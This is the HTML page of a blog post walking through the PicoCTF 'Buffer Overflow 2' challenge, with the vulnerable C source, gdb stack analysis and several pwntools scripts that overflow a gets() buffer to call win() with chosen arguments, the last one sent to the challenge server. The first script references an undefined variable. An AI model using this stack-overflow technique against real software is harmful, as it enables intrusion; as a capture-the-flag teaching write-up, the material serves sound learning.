@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta name="robots" content="noai, noimageai">
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            PicoCTF: Buffer Overflow 2  &ndash;
+        
+        Ep1cac
+    </title>
+
+    
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="SqW5hUbDk1THb+/o9+mQhLWLs67iY/ZZd8oDWaPUHPM6czrXoBrraS/IPO01ABSB34QVDeuhBD+AYGLPpecQpQ=="/>
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="KD6Cerdo1+0NOS06oSkDOIZF8ji7Vn2kVVhDx91gTCvDbqp+Aqa0eaIAu+Amv8NDoSnTy2E0pxLiIAfMFrcg5Q=="/>
+
+    
+    
+    <link type="text/css" rel="stylesheet" href=http://localhost:1313/css/styles.92a5dd122dc2f6b3f4e1ddbdc5136b6ddc6386b3fd22c6fb8daa45dad3fc4e84b98b7a7dd7949fea7fdea189c7d1adbb213c24cf54b346b49a9ac53976accd44.css integrity="sha512-kqXdEi3C9rP04d29xRNrbdxjhrP9Isb7japF2tP8ToS5i3p915Sf6n/eoYnH0a27ITwkz1SzRrSamsU5dqzNRA==" />
+<meta name="author" content="Ep1cac" />
+
+    
+        <meta name="keywords" content='Binary Exploitation, Buffer Overflow, Code Review, Pwn, x86' />
+    
+    
+        <meta name="description" content="&gt;Description&lt;/h3&gt;
+&lt;p&gt;Buffer Overflow 2 is a binary exploitation challenge that involves overflowing a buffer to not only call the win() function, but also to successfully pass the necessary arguments to it.&lt;/p&gt;" />
+    
+
+<meta property="og:site_name"
+    content='Ep1cac' />
+
+    <meta property="og:title" content="PicoCTF: Buffer Overflow 2" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Ep1cac" />
+    <meta
+        property="article:published_time"
+        content='2024-10-09T14:23:13Z-0500' />
+    
+        
+            <meta property="article:tag" content="Binary Exploitation" />
+        
+            <meta property="article:tag" content="Buffer Overflow" />
+        
+            <meta property="article:tag" content="Code Review" />
+        
+            <meta property="article:tag" content="Pwn" />
+        
+            <meta property="article:tag" content="x86" />
+        
+    
+    <meta property="og:url" content="http://localhost:1313/posts/pico_buff2/" />
+    
+    
+    <meta property="og:image"
+        content="http://localhost:1313/img/icon.svg" />
+    
+        <meta property="og:description" content="&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
+&lt;p&gt;Buffer Overflow 2 is a binary exploitation challenge that involves overflowing a buffer to not only call the win() func" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='localhost:1313'
+/>
+<meta property="twitter:url" content="http://localhost:1313/posts/pico_buff2/" />
+
+
+    <meta name="twitter:title" content="PicoCTF: Buffer Overflow 2" />
+    
+    
+    
+    <meta name="twitter:image"
+        content="http://localhost:1313/img/icon.svg" />
+    
+        <meta name="twitter:description" content="&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
+&lt;p&gt;Buffer Overflow 2 is a binary exploitation challenge that involves overflowing a buffer to not only call the win() func" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' alt='Logo'/>
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">Ep1cac</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts/">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="/about">About</a></li>
+        
+        
+            <li><a href="/tags/">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search/?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/qihan-w-291838222/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        LinkedIn
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/Ep1cac">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>PicoCTF: Buffer Overflow 2</h1>
+    
+    
+        <p class="date">
+            <span title='Date'>󰃭 </span>
+    2024-10-09
+
+</p>
+    
+    
+    
+    
+    <div><h3 id="description">Description</h3>
+<p>Buffer Overflow 2 is a binary exploitation challenge that involves overflowing a buffer to not only call the win() function, but also to successfully pass the necessary arguments to it.</p>
+<h3 id="walkthrough">Walkthrough</h3>
+<p>After downloading the vulnerable binary and its source code, the first thing I did was to view the source code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFSIZE 100
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FLAGSIZE 64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg2) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[FLAGSIZE];
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;own debugging flag.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(buf,FLAGSIZE,f);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xCAFEF00D</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xF00DF00D</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[BUFSIZE];
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(buf);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">gid_t</span> gid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresgid</span>(gid, gid, gid);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Please enter your string: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">vuln</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It is apparent that the binary is using the vulnerable <code>gets()</code>
+function with a buffer size of 100 bytes. We will need to overflow the buffer and
+call <code>win()</code> as well as pass in two arguments, <code>0xCAFEF00D</code> and
+<code>0XF00DF00D</code>, in order to complete this challenge.</p>
+<p>We can also see that we need a dummy flag in order for the program to execute correctly.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Writeups/pico/buff2]
+└─$ echo &#39;pico{debug}&#39; &gt; flag.txt
+</code></pre><p>To overflow the buffer, we first need to find the offset of the eip register. eip stands for
+&ldquo;Extended Instruction Pointer&rdquo; and as its name suggests, points to the next instruction to be
+executed in x86 systems. We want to write the address of <code>win()</code> to it. To find the address,
+we can analyze <code>vuln</code> in gdb&hellip;</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Writeups/pico/buff2]
+└─$ gdb vuln
+</code></pre><p>&hellip; and find the buffer allocation.</p>
+<p><img src="/img/pico/buff2/vuln_gets_alloc.png" alt="GDB vuln buffer size"></p>
+<p>Notice that the address of offset <code>ebp-0x6c</code> is pushed onto the stack and is
+read by <code>gets()</code>. This means that after calling the <code>gets</code> function, there will be
+108 (0x6c) bytes of buffer between the start of the buffer and the <code>ebp</code> register. Note
+that the 108 bytes allocated differ from the 100-byte buffer declared in <code>vuln.c</code>.
+Discrepancies like this are usually caused by padding or local variables.</p>
+<div style="display: flex; justify-content: center;">
+    <table>
+        <table>
+  <thead>
+      <tr>
+          <th style="text-align: left">High Address</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">&hellip;</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">eip (4 bytes)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">ebp (4 bytes)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">buffer + padding (108 bytes)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">&hellip;</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">Low Address</td>
+      </tr>
+  </tbody>
+</table>
+
+    </table>
+</div>
+<p><code>eip</code> is at a higher address immediately after <code>ebp</code>. Since <code>ebp</code> is a 4 byte register,
+<code>eip</code> is 112 (108 + 4) bytes from the start of the buffer. We will therefore need 112 bytes of padding
+in our payload before <code>eip</code> starts being overwritten.</p>
+<p>Preliminary payload: 112 bytes padding + address of win().</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addr_main <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>		padding,
+</span></span><span style="display:flex;"><span>		addr_win
+</span></span><span style="display:flex;"><span>		]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>I didn&rsquo;t get a clear indication as to whether my payload succeeded, so I added a breakpoint
+at the <code>win()</code> function through gdb. If <code>win()</code> is called, the program will pause execution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addr_win <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>		padding,
+</span></span><span style="display:flex;"><span>		addr_win
+</span></span><span style="display:flex;"><span>		]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>g <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>attach(p, gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b *win
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        r &lt; payload
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img src="/img/pico/buff2/win_stop.png" alt="win() function stop"></p>
+<p>We do break, meaning our exploit successfully called <code>win()</code>. Now, we need to add
+the arguments <code>0XCAFEF00D</code> and <code>0XF00DF00D</code>. Let us take a look at the stack
+frame for <code>win()</code>.</p>
+<div style="display: flex; justify-content: center;">
+    <table>
+        <table>
+  <thead>
+      <tr>
+          <th style="text-align: left">High Address</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">&hellip;</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">arg2 (4 bytes)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">arg1 (4 bytes)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">eip (4 bytes)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">ebp (4 bytes)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">&hellip;</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">Low Address</td>
+      </tr>
+  </tbody>
+</table>
+
+    </table>
+</div>
+<p>Unlike x64 binaries, all function arguments in x86 programs are passed directly onto the stack.
+After jumping to <code>win()</code>, we will also need to overflow <code>eip</code> before we can pass in arg1 and arg2.
+In my exploit script I set <code>eip</code> to be overflowed with the address of <code>main()</code> for the sake of
+having a valid return address, but any 4 byte value should work since the flag is being printed directly in <code>win()</code> and we won&rsquo;t need to jump to another address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addr_win <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])
+</span></span><span style="display:flex;"><span>addr_main <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xCAFEF00D</span>)
+</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xF00DF00D</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        padding,
+</span></span><span style="display:flex;"><span>        addr_win,
+</span></span><span style="display:flex;"><span>        addr_main,
+</span></span><span style="display:flex;"><span>        arg1,
+</span></span><span style="display:flex;"><span>        arg2
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img src="/img/pico/buff2/local_flag.png" alt="Local binary flag"></p>
+<p>Our exploit was successful. Now all that&rsquo;s left to do is to change the target from
+the local binary to the remote pico server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Change from local binary to remote pico server.</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;saturn.picoctf.net&#34;</span>, <span style="color:#ae81ff">54042</span>) 
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addr_win <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])
+</span></span><span style="display:flex;"><span>addr_main <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xCAFEF00D</span>)
+</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xF00DF00D</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        padding,
+</span></span><span style="display:flex;"><span>        addr_win,
+</span></span><span style="display:flex;"><span>        addr_main,
+</span></span><span style="display:flex;"><span>        arg1,
+</span></span><span style="display:flex;"><span>        arg2
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img src="/img/pico/buff2/flag.png" alt="Pico flag"></p>
+</div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/binary-exploitation/">#Binary Exploitation</a>
+        
+            <a
+                
+                href="/tags/buffer-overflow/">#Buffer Overflow</a>
+        
+            <a
+                
+                href="/tags/code-review/">#Code Review</a>
+        
+            <a
+                
+                href="/tags/pwn/">#Pwn</a>
+        
+            <a
+                
+                href="/tags/x86/">#x86</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2024 &copy; Ep1cac
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
